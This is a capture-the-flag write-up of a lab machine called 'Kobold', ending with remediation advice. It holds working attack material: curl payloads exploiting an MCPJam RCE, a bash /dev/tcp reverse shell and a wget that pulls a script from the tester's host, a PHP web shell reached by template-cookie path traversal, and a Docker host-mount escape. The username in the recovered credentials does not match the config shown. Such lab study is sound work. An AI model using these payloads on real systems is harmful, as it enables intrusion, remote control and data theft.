| Property       | Value                                                                                                                            |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| **OS**         | Linux                                                                                                                            |
| **Difficulty** | Easy                                                                                                                             |
| **Release**    | 2026-03-21                                                                                                                       |
| **State**      | Active                                                                                                                           |
| **IP**         | 10.129.58.91                                                                                                                     |
| **Techniques** | vhost enumeration, MCP RCE, group-based write abuse, LFI via template injection, credentials disclosure, Docker container escape |
| **Tags**       | #web #privesc #linux #docker #mcp                                                                                                |

---
## Summary

Kobold is an easy Linux machine hosting an Arcane Docker management interface on port 3552.
Virtual host enumeration reveals two subdomains: `bin.kobold.htb`, running a PrivateBin instance, and `mcp.kobold.htb`, running MCPJam v1.4.2, which is vulnerable to an unauthenticated RCE (GHSA-232v-j27c-5pp6). The vulnerability is exploited to gain a reverse shell as `ben`. `ben` belongs to the `operator` group, which has write access to a world-writable subdirectory inside the PrivateBin data folder. A PHP web shell can be written in the directory and accessed via PrivateBin's template cookie parameter, achieving code execution as `www-data`. The PrivateBin configuration file contains plaintext credentials that grant access to the Arcane instance. From Arcane, a new container is created with the host filesystem mounted, allowing arbitrary file read as root.

> **Note:** The machine has different IP addresses across sections of this writeup due to multiple restarts.

---
## Enumeration

```
echo '10.129.58.91 kobold.htb' | sudo tee -a /etc/hosts
```

Added the IP address of the machine to the `/etc/hosts` file.

### Nmap Scan

```
sudo nmap -sV -sC kobold.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-06 05:36 EDT
Nmap scan report for kobold.htb (10.129.58.91)
Host is up (0.044s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
|_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Kobold Operations Suite
| ssl-cert: Subject: commonName=kobold.htb
| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
| Not valid before: 2026-03-15T15:08:55
|_Not valid after:  2125-02-19T15:08:55
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
sudo nmap -p- kobold.htb
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3552/tcp open  taserver
```

### Service Enumeration

Port 3552 hosts an Arcane instance, a web UI for managing Docker containers, images, networks, and volumes.

![](./screens/1.png)

**Virtual host discovery:**

```
ffuf -w /home/kali/SecLists/Discovery/DNS/subdomains-top1million-20000.txt \
  -u https://10.129.59.28 \
  -H 'Host: FUZZ.kobold.htb' \
  -fs 154

mcp   [Status: 200, Size: 466,   Words: 57,   Lines: 15,  Duration: 33ms]
bin   [Status: 200, Size: 24402, Words: 1218, Lines: 386, Duration: 102ms]
```

```
echo '10.129.59.28 bin.kobold.htb' | sudo tee -a /etc/hosts
echo '10.129.59.28 mcp.kobold.htb' | sudo tee -a /etc/hosts
```

`bin.kobold.htb` hosts a PrivateBin instance. 
`mcp.kobold.htb` hosts MCPJam v1.4.2, which is vulnerable to unauthenticated RCE.

**Vulnerable MCPJam instance  ([CVE-2026-23744](https://github.com/advisories/GHSA-232v-j27c-5pp6)) :

![](./screens/2.png)

---

## Foothold

### CVE-2026-23744

Versions 1.4.2 and earlier are vulnerable to remote code execution (RCE) vulnerability, which allows an attacker to send a crafted HTTP request that triggers the installation of an MCP server, leading to RCE. Since MCPJam inspector by default listens on 0.0.0.0 instead of 127.0.0.1, an attacker can trigger the RCE remotely via a simple HTTP request. The `/api/mcp/connect` API, which is intended for connecting to MCP servers, becomes an open entry point for unauthorized requests. When an HTTP request reaches the `/connect` route, the system extracts the `command` and `args` fields without performing any security checks, leading to the execution of arbitrary command.

### Exploitation

Confirming the vulnerability with an outbound connection:

shell

```shell
curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"wget","args":["http://10.10.14.224:1111"],"env":{}},"serverId":"1"}'
```

```
nc -lvnp 1111
connect to [10.10.14.224] from (UNKNOWN) [10.129.60.161] 54326
GET / HTTP/1.1
Host: 10.10.14.224:1111
User-Agent: Wget/1.21.4
```

The listener receives the request, confirming code execution. A reverse shell is obtained by staging a bash script and executing it via two subsequent requests:

shell

```shell
cat shell.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.224/1111 0>&1

python3 -m http.server 8000
```

shell

```shell
# Stage the shell script on the target
curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"wget","args":["-O","/tmp/shell.sh","http://10.10.14.224:8000/shell.sh"],"env":{}},"serverId":"1"}'

# Execute it
curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"bash","args":["/tmp/shell.sh"],"env":{}},"serverId":"1"}'
```

```
nc -lvnp 1111
connect to [10.10.14.224] from (UNKNOWN) [10.129.60.161] 53162
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

Shell obtained as `ben`. Upgraded to a full interactive TTY:

shell

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## User Flag

```
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ cat /home/ben/user.txt
0d9673a3692aa1a3e0631255bdfa9dca
```

---

## Privilege Escalation

### Enumeration

Enumerating files owned by the `operator` group:

shell

```shell
ben@kobold:~$ find / -group operator 2>/dev/null
/privatebin-data
/privatebin-data/certs
/privatebin-data/certs/key.pem
/privatebin-data/certs/cert.pem
/privatebin-data/data
/privatebin-data/data/purge_limiter.php
/privatebin-data/data/bd
/privatebin-data/data/bd/b5
/privatebin-data/data/.htaccess
/privatebin-data/data/e3
```

The `bd/b5` subdirectory is world-writable and falls within the PrivateBin data directory:

shell

```shell
ben@kobold:/privatebin-data/data/bd$ ls -la
total 12
drwxrwxrwx 3 root operator 4096 Mar 15 21:23 .
drwxrwxrwx 5 root operator 4096 Mar 15 21:23 ..
drwxrwxrwx 2 root operator 4096 Mar 15 21:23 b5
```

### Web Shell via Template Cookie Injection

PrivateBin's template selection feature uses a session cookie (`template`) to load a PHP template file from the `tpl/` directory. The path is not sanitized, allowing traversal into arbitrary directories. A PHP web shell dropped into `bd/b5/` can be loaded by pointing the cookie at that path.

shell

```shell
ben@kobold:/privatebin-data/data/bd/b5$ echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
```

Verifying execution via curl:

shell

```shell
curl -k https://bin.kobold.htb/ \
  -b "template=../data/bd/b5/shell" \
  -G --data-urlencode "cmd=id"

uid=65534(nobody) gid=82(www-data) groups=82(www-data)
```

Mostra immagine

Mostra immagine

### Credentials Disclosure

Reading the PrivateBin configuration file through the web shell:

shell

```shell
curl -k https://bin.kobold.htb/ \
  -b "template=../data/bd/b5/shell" \
  -G --data-urlencode "cmd=cat /srv/cfg/conf.php"
```

The configuration file contains a commented-out MySQL model section with plaintext credentials:

ini

```ini
[model]
; Temporarily disabling while we migrate to new server for loadbalancing
[model_options]
dsn = "mysql:host=localhost;dbname=privatebin;charset=UTF8"
tbl = "privatebin_"
usr = "privatebin"
pwd = "ComplexP@sswordAdmin1928"
```

Credentials recovered: `arcane:ComplexP@sswordAdmin1928`

### Docker Container Escape via Arcane

These credentials grant access to the Arcane instance on port 3552.

Mostra immagine

Arcane is a Docker management UI. A new container is created with the host filesystem bind-mounted at `/mnt/host`, using a privileged image. This gives root-level read access to the entire host filesystem from within the container.

Mostra immagine

Mostra immagine

Mostra immagine

```
root@<container-id>:/# cat /mnt/host/root/root.txt
<root_flag>
```

---

## Remediation

- **MCPJam RCE (GHSA-232v-j27c-5pp6):** Upgrade MCPJam to a version beyond v1.4.2. Bind the inspector to `127.0.0.1` and enforce authentication on the `/api/mcp/connect` endpoint.
- **World-writable data directories:** Restrict write permissions on PrivateBin's data subdirectories. The `operator` group should not have write access to paths served by the web server.
- **Template cookie path traversal:** Sanitize and whitelist the `template` cookie value to prevent directory traversal outside the `tpl/` directory.
- **Plaintext credentials in config files:** Remove credentials from configuration files once they are no longer in use. Use secret management tooling (e.g. environment variables, Vault) instead of hardcoded values.
- **Arcane / Docker socket exposure:** Restrict access to the Docker management UI to trusted networks or authenticated users only. Avoid exposing the Docker socket or management interfaces to accounts or services that don't require it.

---

## References

- [GHSA-232v-j27c-5pp6 — MCPJam RCE](https://github.com/advisories/GHSA-232v-j27c-5pp6)
- [GTFOBins — Docker](https://gtfobins.github.io/gtfobins/docker/)
- [PrivateBin Configuration Reference](https://github.com/PrivateBin/PrivateBin/wiki/Configuration)